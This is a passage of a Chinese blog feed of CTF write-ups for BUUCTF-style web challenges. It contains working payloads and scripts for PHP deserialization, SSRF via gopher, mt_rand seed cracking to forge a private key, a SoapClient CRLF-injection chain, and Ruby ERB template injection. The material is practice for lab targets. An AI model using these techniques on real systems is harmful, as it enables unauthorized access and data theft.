class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p><p>算了，环境也关了，附上<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p><p>还有一道GO语言的题…….完全不懂…..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;UploadHub&quot;&gt;&lt;a href=&quot;#UploadHub&quot; class=&quot;headerlink&quot; title=&quot;UploadHub&quot;&gt;&lt;/a&gt;UploadHub&lt;/h2&gt;&lt;p&gt;文件上传题&lt;br&gt;给了源码，其中有些配置文件看不懂，放弃了   &lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/categories/CTF/wicctf/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/tags/wicctf/"/>
    
  </entry>
  
  <entry>
    <title>StrongestMind</title>
    <link href="http://lll-nnn.github.io/2021/05/10/BUU85/"/>
    <id>http://lll-nnn.github.io/2021/05/10/BUU85/</id>
    <published>2021-05-10T15:19:37.000Z</published>
    <updated>2021-05-10T15:41:06.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>打开环境 </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>python脚本      </p><p>还不会写，研究下大佬的      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>():</span>    s = requests.session()       <span class="hljs-comment">#会话保持</span>    url = <span class="hljs-string">&#x27;http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/&#x27;</span>    match = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)  <span class="hljs-comment">#正则匹配   +：匹配前面的表达式一次或多次</span>    r = s.get(url)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):        sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-built_in">str</span> = match.findall(r.text)[<span class="hljs-number">0</span>]        print(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(eval(str))</span>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span> : <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)&#125;   <span class="hljs-comment">#eval执行</span>        r = s.post(url, data=data)        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span>        print(<span class="hljs-string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)))        <span class="hljs-comment"># print(r.text)</span>    print(r.text)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    count()</code></pre></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PY&quot;&gt;&lt;a href=&quot;#PY&quot; class=&quot;headerlink&quot; title=&quot;PY&quot;&gt;&lt;/a&gt;PY&lt;/h2&gt;&lt;p&gt;打开环境 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/categories/CTF/python/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/tags/python/"/>
    
    <category term="exp" scheme="http://lll-nnn.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>Ezaudit</title>
    <link href="http://lll-nnn.github.io/2021/05/08/BUU84/"/>
    <id>http://lll-nnn.github.io/2021/05/08/BUU84/</id>
    <published>2021-05-08T10:07:27.000Z</published>
    <updated>2021-05-08T10:34:07.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>题目打开是这样，挺正经的，以为是什么漏洞，源码中也没有提示     </p><p>看一眼题目名<code>Ezaudit</code>简单的审计     </p><p>哦   </p><p><code>www.zip</code>  </p><p>果然   </p><p>下载下来是<code>index.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )    &#123;        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>;         $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);        $result = mysql_query($getuser);        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;        &#125;    &#125;    &#125;&#125; <span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;  &#125;  <span class="hljs-comment">//genarate private_key</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;  &#125;  $Public_key = public_key();  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></code></pre></code></pre><p>首先要获取到<code>private_key</code>    </p><p>之前也做过一道<code>mt_rand</code>的题目，那一道是根据前几位得到<code>seed</code>      </p><p>这次用<code>public_key</code>得到<code>seed</code>这两个应该是同一个<code>seed</code>吧   </p><p>不过这次用之前的脚本转换时爆不出来     </p><p>找了一个新的脚本     </p><p>发现少了一位，我之前那道题是怎么做出来的！！！？？？   </p><p>PHP版：     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2+<span class="hljs-number">1</span>;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>python版：    </p><pre><code><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>key = <span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>m = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):        <span class="hljs-keyword">if</span> i == s[j]:            m += <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(j,j,<span class="hljs-built_in">len</span>(s)<span class="hljs-number">-1</span>)print(m)</code></pre></code></pre><p>转换后的结果：      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>注意这里的PHP版本为<code>5.2.1 to 7.0.x</code>如果版本不对的话，生成的也不一样。</p><p>重新生成<code>private_key</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">1775196155</span>);<span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>)</span><span class="hljs-function"></span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;&#125;<span class="hljs-comment">//genarate private_key</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>)</span><span class="hljs-function"></span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;&#125;<span class="hljs-keyword">echo</span> public_key().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> private_key();</code></pre></code></pre><p>得到：     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sql万能公式得到flag：     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0&quot;&gt;&lt;a href=&quot;#0&quot; class=&quot;headerlink&quot; title=&quot;-0-)&quot;&gt;&lt;/a&gt;-0-)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.c</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="mt_srand" scheme="http://lll-nnn.github.io/tags/mt-srand/"/>
    
  </entry>
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="http://lll-nnn.github.io/2021/05/06/BUU83/"/>
    <id>http://lll-nnn.github.io/2021/05/06/BUU83/</id>
    <published>2021-05-06T15:28:04.000Z</published>
    <updated>2021-05-07T15:34:01.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHP中SESSION反序列化   <ul><li>PHP中的session中的内容是以文件的方式存储的，并不是存于内存中，存储方式由配置项<code>session.save_handler</code>控制，默认文件。</li><li>文件以sess_sessionid进行命名，文件的内容是session值序列化后的内容</li><li>在<code>php.ini</code>中存在三项配置：</li><li><code>session.save_path=&quot;&quot;</code>   –设置session的存储路径     </li><li><code>session.save_handler=&quot;&quot; </code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)       </li><li><code>session.serialize_handler   string</code> –定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)    </li><li><code>session.serialize_handler</code>存在三种模式   </li><li><code>php_binary</code>—&gt;键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        </li><li><code>php</code>—-&gt;键名+竖线（|）+经过serialize()函数处理过的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>—-&gt;经过serialize()函数处理过的值，会将键名和值当作一个数组序列化   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   </li><li>如果能够改变序列化的模式，比如默认是PHP，将其改为<code>php_serialize</code>，出入序列化前面加上<code>|</code>，这样反序列化时，按默认的<code>php</code>时，传入的序列化就被反序列化了      </li></ul></li></ul><ul><li><p>PHP原生类<code>SoapClient</code>，当其中的<code>__call</code>方法触发时可以发送HTTP和HTTPs请求</p><ul><li><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code>      </li><li>第一个参数指明是否为<code>wsdl模式</code>     </li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>简单说就是在请求头中注入<code>\r\n</code>,从而生成新的请求头，或者覆盖原来的请求头，或者注入<code>\r\n\r\n</code>,注入请求（头和体由两个<code>\r\n</code>分割）     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b, $a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>一开始，直接一个<code>$_POST</code>没反应过来<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>发现<code>flag.php</code>      </p><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;   &#125;only localhost can get flag!</code></pre></code></pre><p>解题思路：首先可以通过第一个<code>call_user_func</code>覆盖<code>serialize_handler</code>为<code>php_serialize</code>，在name中写入利用<code>soapClient</code>产生的序列化；第二次通过<code>extract</code>覆盖变量<code>b</code>为<code>call_user_func</code>，name为<code>SoapClient</code>，当<code>call_user_func</code>的参数为一个数组时，会把键名当作一个类名，值当作方法；</p><p><code>call_user_func($b, $a);</code>——&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>——&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>—–&gt;没有这个方法，从而调用<code>__call</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>第一次使用SoapClient类会报错，需要在<code>php.ini</code>中打开<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>传入 </p><pre><code>f=session_start&amp;name=[生成的payload]         POST: serializer_handler=php_serialize</code></pre><p>然后传</p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>来触发类    </p><p>但我这里没成功，试了好几个师傅的都不行        </p><p>算了    </p><p>就当积累知识点吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Knowledge&quot;&gt;&lt;a href=&quot;#Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Knowledge&quot;&gt;&lt;/a&gt;Knowledge&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;PHP中SESSION反序列化   &lt;ul&gt;
&lt;li&gt;PHP中的sess</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="原生类" scheme="http://lll-nnn.github.io/tags/%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>Flag Shop</title>
    <link href="http://lll-nnn.github.io/2021/05/04/BUU82/"/>
    <id>http://lll-nnn.github.io/2021/05/04/BUU82/</id>
    <published>2021-05-04T13:29:59.000Z</published>
    <updated>2021-05-04T14:27:04.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>打开环境</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>点一下<code>buy flag</code>     </p><p>弹出了<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>想到了应该是要伪造cookie     </p><p>顺便看看<code>robots.txt</code>，居然有    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>虽然看不懂是啥，但看到了jwt     </p><p>cookie应该就是jwt了吧     </p><p>解码一下     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>确实，试着用<code>jwtcrack</code>爆破一下secret      </p><p>爆了一会，感觉爆不出来    </p><p>难道不是这个考点    </p><p>回去看那个源码    </p><p>看不懂     </p><p>还是去看WP吧   </p><hr><p>ruby的ERB模板注入     </p><p>主要的代码    </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>参数<code>SECRET</code>与真的<code>SECRET</code>匹配，成功则返回flag    </p><p>参数<code>do</code>与<code>name</code>，如果do的值与name的前七位加上<code> is working</code>一样，会弹出<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>这里存在模板注入</p><p>REB模板注入的格式<code>&lt;%=7*7%&gt;</code>——-&gt;49      </p><p>然后是ruby中的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>–&gt;<code>$&#39;</code>返回最后一次成功匹配右边的字符串      